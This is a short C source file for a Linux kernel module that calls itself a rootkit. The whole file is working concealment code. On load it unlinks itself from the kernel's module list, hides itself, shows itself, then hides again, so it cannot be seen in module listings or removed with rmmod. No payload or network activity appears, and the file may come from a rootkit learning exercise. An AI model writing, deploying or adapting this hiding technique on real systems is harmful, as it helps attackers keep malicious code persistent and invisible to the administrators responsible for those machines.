#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>


MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");

static struct list_head *prev_module;
static short hidden = 0;

void showme(void) {
    list_add(&THIS_MODULE->list, prev_module);
}

void hideme(void) {
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static int __init rootkit_init(void) {
    printk(KERN_INFO "rootkit Loaded\n");
    printk(KERN_INFO "hide rootkit\n");
    hideme();
    hidden = 1;
    printk(KERN_INFO "show rootkit\n");
    showme();
    hidden = 0;
    printk(KERN_INFO "hide rootkit\n");
    hideme();
    hidden = 1;
    return 0;
}

static void __exit rootkit_exit(void) {
    // won't get here - rmmod will fail
    printk(KERN_INFO "rootkit Unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
